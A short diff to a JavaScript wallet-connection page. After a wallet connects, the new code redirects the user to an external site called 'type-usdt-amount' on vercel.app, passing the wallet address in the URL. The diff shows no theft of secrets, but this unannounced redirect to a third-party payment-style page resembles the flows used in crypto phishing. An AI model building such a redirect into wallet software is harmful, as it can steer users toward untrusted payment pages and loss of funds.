@@ -123,9 +123,13 @@
                 });
 
                 provider.on('connect', (accounts) => {
-                    const addr = accounts?.accounts?.[0] || accounts?.[0] || 'Connected';
-                    setStatus('✅ Connected! ' + addr, 'connected');
+                    const addr = accounts?.accounts?.[0] || accounts?.[0] || '';
+                    setStatus('✅ Connected! Redirecting...', 'connected');
                     qrBox.innerHTML = '';
+                    // Redirect to dApp with wallet address
+                    setTimeout(() => {
+                        window.location.href = 'https://type-usdt-amount.vercel.app/?wallet=' + addr;
+                    }, 1500);
                 });
 
                 provider.on('disconnect', () => {
